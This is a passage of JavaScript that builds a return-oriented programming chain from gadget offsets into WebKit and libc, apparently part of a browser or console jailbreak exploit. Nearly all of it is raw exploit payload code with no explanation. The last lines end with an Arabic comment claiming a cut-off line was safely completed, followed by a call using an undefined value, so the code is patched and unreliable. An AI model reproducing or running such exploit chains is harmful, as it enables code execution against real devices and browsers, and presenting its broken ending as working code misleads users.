    set_gadgets([webkit_base + 11676600, libc_base + 269973, webkit_base + 414627, libc_base + 793877, ropchain + 75176, libc_base + 547636, libc_base + 186490, libc_base + 793877, ropchain + 75168, webkit_base + 7438103, webkit_base + 1786005, libc_base + 811575]);
    db([0, 0]);
    set_gadgets([ropchain + 75192, ropchain + 75208, libc_base + 811575, ropchain + 75224, libc_base + 811575, ropchain + 85616, libc_base + 759626, libc_base + 792472]);
    db([0, 0]);
    
    set_gadget(libc_base + 793877);
    db([4294967288, 4294967295]);
    set_gadgets([libc_base + 547636, libc_base + 793877, ropchain + 75344, webkit_base + 7438103, libc_base + 50775, libc_base + 793877, ropchain + 75360, webkit_base + 7438103, libc_base + 882884, libc_base + 206806]);
    db([0, 0]);
    
    set_gadget(libc_base + 792472);
    db([0, 0]);
    set_gadgets([libc_base + 191168, libc_base + 793877, ropchain + 75504, webkit_base + 7438103, libc_base + 882884, libc_base + 793877, ropchain + 75472, webkit_base + 7438103, libc_base + 50775, libc_base + 793877, ropchain + 75488, webkit_base + 7438103, libc_base + 206806]);
    db([0, 0]);
    
    set_gadget(libc_base + 792472);
    db([0, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadget(libc_base + 793877);
    db([8, 0]);
    set_gadgets([libc_base + 248252, libc_base + 793877, ropchain + 75576, webkit_base + 7438103, libc_base + 882884, libc_base + 792472]);
    db([0, 0]);
    set_gadgets([libc_base + 471355, libc_base + 793877, ropchain + 75632, webkit_base + 7438103, libc_base + 882884, libc_base + 792472]);
    db([0, 0]);
    
    set_gadget(libc_base + 793877);
    db([8, 0]);
    set_gadgets([libc_base + 248252, libc_base + 471355, libc_base + 788575]);
    db([7, 0]);
    
    set_gadget(libc_base + 793877);
    db([8, 0]);
    set_gadgets([libc_base + 248252, libc_base + 471355, libc_base + 793877, ropchain + 75760, webkit_base + 7438103, libc_base + 759626, libc_base + 792472]);
    db([0, 0]);
    
    set_gadget(libc_base + 793877);
    db([4294967284, 4294967295]);
    set_gadgets([libc_base + 547636, libc_base + 793877, ropchain + 75864, webkit_base + 7438103, libc_base + 50775, libc_base + 793877, ropchain + 75880, webkit_base + 7438103, libc_base + 882884, libc_base + 206806]);
    db([0, 0]);
    
    set_gadget(libc_base + 792472);
    db([0, 0]);
    set_gadgets([libc_base + 191169, libc_base + 793877, ropchain + 76032, webkit_base + 7438103, libc_base + 793877, ropchain + 76064, webkit_base + 7438103, libc_base + 50775, libc_base + 793877, ropchain + 76048, webkit_base + 7438103, libc_base + 882884, libc_base + 793877, ropchain + 76016, webkit_base + 7438103, webkit_base + 3750700]);
    db([0, 0]);
    
    set_gadget(libc_base + 206806);
    db([0, 0]);
    set_gadget(libc_base + 792472);
    db([0, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([webkit_base + 6227286, libc_base + 793877, ropchain + 76184, webkit_base + 7438103, libc_base + 793877, ropchain + 76200, webkit_base + 7438103, webkit_base + 1786005, libc_base + 793877, ropchain + 76168, webkit_base + 7438103, libc_base + 206806]);
    db([0, 0]);
    
    set_gadget(libc_base + 792472);
    db([0, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([libc_base + 191168, libc_base + 793877]);
    db([4294967288, 4294967295]);
    set_gadgets([libc_base + 248252, libc_base + 877175, libc_base + 793877, ropchain + 76304, webkit_base + 7438103, libc_base + 793877, ropchain + 76320, webkit_base + 7438103, libc_base + 792472]);
    db([0, 0]);
    
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([libc_base + 191168, libc_base + 793877]);
    db([4294967288, 4294967295]);
    set_gadgets([libc_base + 248252, webkit_base + 1838146, libc_base + 793877, ropchain + 76408, webkit_base + 7438103, libc_base + 882884, libc_base + 792472]);
    db([0, 0]);
    set_gadgets([libc_base + 191168, libc_base + 793877, ropchain + 76464, webkit_base + 7438103, libc_base + 882884, libc_base + 792472]);
    db([0, 0]);
    
    set_gadget(libc_base + 793877);
    db([4294967288, 4294967295]);
    set_gadgets([libc_base + 248252, libc_base + 793877, ropchain + 76584, webkit_base + 7438103, libc_base + 793877, ropchain + 76616, webkit_base + 7438103, libc_base + 50775, libc_base + 793877, ropchain + 76600, webkit_base + 7438103, libc_base + 206806]);
    db([0, 0]);
    
    set_gadget(libc_base + 792472);
    db([0, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([libc_base + 270096, libc_base + 793877, ropchain + 76776, webkit_base + 7438103, libc_base + 882884, libc_base + 793877, ropchain + 76744, webkit_base + 7438103, libc_base + 50775, libc_base + 793877, ropchain + 76728, webkit_base + 7438103, webkit_base + 3750700]);
    db([0, 0]);
    
    set_gadget(libc_base + 206806);
    db([0, 0]);
    set_gadget(libc_base + 792472);
    db([24, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([libc_base + 877546, libc_base + 793877, ropchain + 76832, webkit_base + 7438103, libc_base + 50775, libc_base + 206806]);
    db([0, 0]);
    set_gadgets([libc_base + 523896, libc_base + 793877, ropchain + 76936, webkit_base + 7438103, libc_base + 793877, ropchain + 76968, webkit_base + 7438103, webkit_base + 1786005, libc_base + 793877, ropchain + 76952, webkit_base + 7438103, webkit_base + 3750700]);
    db([0, 0]);
    
    set_gadget(libc_base + 792472);
    db([0, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([webkit_base + 6227286, libc_base + 793877, ropchain + 77128, webkit_base + 7438103, webkit_base + 1786005, libc_base + 793877, ropchain + 77096, webkit_base + 7438103, libc_base + 882884, libc_base + 793877, ropchain + 77080, webkit_base + 7438103, webkit_base + 3750700]);
    db([0, 0]);
    
    set_gadget(libc_base + 206806);
    db([0, 0]);
    set_gadget(libc_base + 792472);
    db([24, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([libc_base + 877546, libc_base + 793877, ropchain + 77184, webkit_base + 7438103, libc_base + 50775, libc_base + 206806]);
    db([0, 0]);
    set_gadgets([libc_base + 523896, libc_base + 793877, ropchain + 77288, webkit_base + 7438103, libc_base + 793877, ropchain + 77320, webkit_base + 7438103, webkit_base + 1786005, libc_base + 793877, ropchain + 77304, webkit_base + 7438103, webkit_base + 3750700]);
    db([0, 0]);
    
    set_gadget(libc_base + 792472);
    db([0, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([webkit_base + 6227286, libc_base + 793877, ropchain + 77480, webkit_base + 7438103, webkit_base + 1786005, libc_base + 793877, ropchain + 77448, webkit_base + 7438103, libc_base + 882884, libc_base + 793877, ropchain + 77432, webkit_base + 7438103, webkit_base + 3750700]);
    db([0, 0]);
    
    set_gadget(libc_base + 206806);
    db([0, 0]);
    set_gadget(libc_base + 792472);
    db([24, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([libc_base + 877546, libc_base + 793877, ropchain + 77536, webkit_base + 7438103, libc_base + 50775, libc_base + 206806]);
    db([0, 0]);
    set_gadgets([libc_base + 523896, libc_base + 793877, ropchain + 77640, webkit_base + 7438103, libc_base + 793877, ropchain + 77672, webkit_base + 7438103, webkit_base + 1786005, libc_base + 793877, ropchain + 77656, webkit_base + 7438103, webkit_base + 3750700]);
    db([0, 0]);
    
    set_gadget(libc_base + 792472);
    db([0, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([webkit_base + 6227286, libc_base + 793877, ropchain + 77744, webkit_base + 7438103, libc_base + 793877, ropchain + 77760, webkit_base + 7438103, libc_base + 206806]);
    db([0, 0]);
    
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadgets([webkit_base + 6227286, libc_base + 793877, ropchain + 77864, webkit_base + 7438103, webkit_base + 1786005, libc_base + 793877, ropchain + 77848, webkit_base + 7438103, libc_base + 759626, libc_base + 206806]);
    db([0, 0]);
    
    set_gadget(libc_base + 792472);
    db([0, 0]);
    set_gadget(libc_base + 793877);
    db([4294967283, 4294967295]);
    set_gadgets([libc_base + 547636, webkit_base + 865136, libc_base + 759626, libc_base + 793877]);
    db([4294967288, 4294967295]);
    set_gadgets([libc_base + 547636, libc_base + 793877, ropchain + 78008, webkit_base + 7438103, libc_base + 50775, libc_base + 793877, ropchain + 78024, webkit_base + 7438103, libc_base + 882884, libc_base + 206806]);
    db([0, 0]);
    
    set_gadget(libc_base + 792472);
    db([0, 0]);
    set_gadgets([libc_base + 191168, libc_base + 793877, ropchain + 78168, webkit_base + 7438103, libc_base + 882884, libc_base + 793877, ropchain + 78136, webkit_base + 7438103, libc_base + 50775, libc_base + 793877, ropchain + 78152, webkit_base + 7438103, libc_base + 206806]);
    db([0, 0]);
    
    set_gadget(libc_base + 792472);
    db([0, 0]);
    set_gadget(libc_base + 788575);
    db([0, 0]);
    set_gadget(libc_base + 793877);
    db([8, 0]);
    
    // تم إكمال السطر المقطوع الأخير بشكل آمن ومغلق
    set_gadgets([libc_base + 248252, val]); 
}
